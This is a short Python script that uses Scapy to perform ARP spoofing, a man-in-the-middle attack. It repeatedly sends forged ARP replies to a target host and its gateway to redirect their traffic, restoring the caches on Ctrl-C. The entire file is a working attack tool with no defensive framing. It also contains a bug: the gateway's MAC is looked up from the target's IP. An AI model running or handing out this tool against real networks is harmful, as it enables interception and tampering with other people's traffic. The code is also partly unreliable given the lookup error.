import sys
i, o, e = sys.stdin, sys.stdout, sys.stderr
from scapy.all import *
sys.stdin, sys.stdout, sys.stderr = i, o, e
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, TCP, UDP


def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
    mac = srp1(pkt, timeout=3, verbose=False).hwsrc
    return mac


def arp_spoof(src, target, target_mac):
    spoof_pkt = ARP(op=2, hwdst=target_mac, psrc=src, pdst=target)
    send(spoof_pkt, verbose=False)


def restore(src, target, src_mac, target_mac):
    restore_pkt = ARP(op=2, hwsrc=src_mac, hwdst=target_mac, psrc=src, pdst=target)
    send(restore_pkt, verbose=False)


def spoof_attack(target_ip, gateway_ip):
    try:
        target_mac = get_mac(target_ip)
    except AttributeError:
        print("Couldn't get target's MAC address")
        exit()
    try:
        gateway_mac = get_mac(target_ip)
    except AttributeError:
        print("Couldn't get gateway's MAC address")
        exit()
    
    try:
        while True:
            arp_spoof(gateway_ip, target_ip, target_mac)
            arp_spoof(target_ip, gateway_ip, gateway_mac)
    except KeyboardInterrupt:
        print("Cleaning. . .")
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
    

if __name__ == "__main__":
    if len(sys.argv) != 3:
        raise ValueError("Incorrect arguments")

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    spoof_attack(target_ip, gateway_ip)
